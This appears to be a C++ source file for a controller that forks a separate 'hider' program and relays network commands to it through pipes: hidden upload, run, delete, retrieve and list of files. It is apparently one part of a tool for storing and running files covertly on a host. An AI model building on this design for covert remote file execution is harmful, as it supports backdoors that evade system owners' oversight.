#include "HiderManeger.h"

#define BUFFER_SIZE (1024)

HiderManeger::HiderManeger() :  hiderPath(DEFAULT_HIDER_PATH), \
                                mthpipe{-1, -1}, \
                                MtHredirect(false), \
                                htmpipe{-1, -1}, \
                                HtMredirect(false) {}


HiderManeger::~HiderManeger() {
    // cyber
}

int waitChild(int pid) {
    // dprintf(2, "waiting\n");
    
    while(waitpid(pid, NULL, 0) == -1) {
        // dprintf(2, "more waiting\n");
        
        if (errno == EINTR) { // continue to loop only in case of EINTR
            continue;
        }
        if (errno != ECHILD) {
            dprintf(2, "Error: %s\n", strerror(errno));
            return -1;
        }
        break;
    }
    return 0;
}

Status HiderManeger::setUpHider(std::string path)
{
    this->hiderPath = path;
    std::cout << "setted hider path: " << hiderPath.c_str() << std::endl;
    return SUCCSESS;
}


void HiderManeger::activateHiderChild(const command& cmd) {
    std::string encFunCode = encodeInt(cmd.fncode);
    std::string encDataLen = encodeInt(cmd.dataLen);
    std::string encStrParam = encodeStr(cmd.strParam);

    std::cout << "hider path: " << this->hiderPath.c_str() << std::endl;

    if (MtHredirect) {
        close(mthpipe[1]);
        dup2(mthpipe[0], STDIN_FILENO);
        // close(mthpipe[0]);
    }
    if (HtMredirect) {
        close(htmpipe[0]);
        dup2(htmpipe[1], STDOUT_FILENO);
        // close(htmpipe[1]);
    }
    std::cerr << "exec hider\n";
    if (execl(this->hiderPath.c_str(), encFunCode.c_str(), encDataLen.c_str(), encStrParam.c_str(), NULL) == -1) {
        std::cerr << "error executing hider: " << std::strerror(errno) << std::endl;
    }
}


Status HiderManeger::activateHider(const command& cmd)
{
    
    std::cout << "forking\n";
    pid_t pid = fork();
    if (pid == -1) {
        return HIDER_FORK_ERROR;
    }
    if (pid == 0) { // child work
        std::cout << "started child" << std::endl;
        activateHiderChild(cmd);
    }

    if (HtMredirect) {
        close(htmpipe[1]);
    }

    if (MtHredirect) {
        close(mthpipe[0]);
    }


    return SUCCSESS;
}

Status HiderManeger::openPipes(int p[])
{
    if (pipe(p) == -1) {
        std::cerr << "error opening pipes" << std::endl;
        return HIDER_PIPE_ERROR;
    }
    return SUCCSESS;
}

// add Status handling
Status HiderManeger::hiddenAction(const command& cmd, Connection& conn)
{
    if (cmd.fncode & HIDDEN_UPLOAD) {
        if (openPipes(mthpipe) != SUCCSESS) {
            return HIDER_PIPE_ERROR;
        }
        MtHredirect = true;
    }

    if (openPipes(htmpipe) != SUCCSESS) {
        return HIDER_PIPE_ERROR;
    }
    HtMredirect = true;

    Status res = activateHider(cmd);

    if (cmd.fncode & HIDDEN_UPLOAD) {
        hiddenUpload(cmd, conn);
    }

    if (cmd.fncode & (HIDDEN_UPLOAD | HIDDEN_RUN | HIDDEN_DELETE))
    {
        responce hiderRes = {.dataLen = 0, .status = SUCCSESS};

        for (int i = 0; i < 3; i++) {
            if (read(htmpipe[0], &hiderRes, sizeof(hiderRes)) < 0) {
                std::cerr << "error reading from hider pipe" << std::endl;
                return READ_FROM_HIDER_ERROR;
            }
            std::cout << "responce status from hider: " << hiderRes.status << std::endl;
            conn.sendResponceStruct(hiderRes);
        }
    }

    if (cmd.fncode & HIDDEN_RETRIEVE_FILE){
        hiddenRetrieve(conn);
    }
    

    if (cmd.fncode & HIDDEN_LIST) {
        hiddenList(conn);
    }

    return res;

}




Status HiderManeger::hiddenUpload(const command& cmd, Connection& conn)
{
    std::cout << "UPLOADING " << cmd.strParam << std::endl;
    // send file server -> pipe
    uint32_t ctr;
    uint32_t transmitBytes;
    int bytes_received;
    for (ctr = 0; ctr < cmd.dataLen; ctr += 4096)
    {
        transmitBytes = MIN(4096, cmd.dataLen - ctr);
        if ((bytes_received = splice(conn.fdIn, nullptr, mthpipe[1], nullptr, transmitBytes, SPLICE_F_MOVE)) == -1) {
            std::cerr << "Error splicing data to hider: " << std::strerror(errno) << std::endl;
            return SPLICE_ERROR;
        }
        std::cout << "sent one page" << std::endl;
    }

    close(mthpipe[1]);
    
    return SUCCSESS;
}

Status HiderManeger::hiddenRetrieve(Connection& conn) {
    uint32_t fileSize;
    char fileContent[CHUNK_SIZE];

    if (read(htmpipe[0], &fileSize, sizeof(fileSize)) < 0)
    {
        std::cerr << "error reading from hider pipe" << std::endl;
        return READ_FROM_HIDER_ERROR;
    }
    conn.sendData(sizeof(fileSize), &fileSize);
    uint32_t ctr;
    uint32_t tranmitBytes;
    for (ctr = 0; ctr < fileSize; ctr += sizeof(fileContent))
    {
        tranmitBytes = MIN(sizeof(fileContent), fileSize - ctr);
        if (read(htmpipe[0], fileContent, tranmitBytes) < 0)
        {
            std::cerr << "error reading from hider pipe" << std::endl;
            return READ_FROM_HIDER_ERROR;
        }
        conn.sendData(tranmitBytes, fileContent);
    }
    
    close(htmpipe[0]);
    return SUCCSESS;
}

Status HiderManeger::hiddenList(Connection& conn)
{
    // loop for receiving file pipe -> server
    int bytes_read;
    while ((bytes_read = splice(htmpipe[0], nullptr, conn.fdOut, nullptr, 4096, SPLICE_F_MOVE)) > 0) {
        if (bytes_read == -1) {
            std::cerr << "Error splicing data: " << std::strerror(errno) << std::endl;
            return SPLICE_ERROR;
        }
    }
    
    close(htmpipe[0]);

    return SUCCSESS;
}